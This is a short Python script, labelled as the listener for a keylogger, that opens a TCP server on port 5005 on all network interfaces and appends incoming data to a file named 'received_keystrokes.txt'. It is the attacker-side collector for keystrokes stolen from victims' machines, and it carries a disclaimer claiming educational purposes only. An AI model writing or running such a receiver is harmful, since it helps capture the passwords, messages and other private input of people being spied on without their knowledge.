# Listener for the Keylogger
# I assume no liability for damages it is for educational purposes only 

import socket

TCP_IP = "0.0.0.0"  # Listen on all network interfaces
TCP_PORT = 5005
BUFFER_SIZE = 1024

# Create a TCP/IP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((TCP_IP, TCP_PORT))
s.listen(1)

print(f"Server listening on {TCP_IP}:{TCP_PORT}")

conn, addr = s.accept()
print(f"Connection from {addr}")

with open("received_keystrokes.txt", "a") as f:
    while True:
        data = conn.recv(BUFFER_SIZE)
        if not data:
            break
        f.write(data.decode())

conn.close()
print("Connection closed")
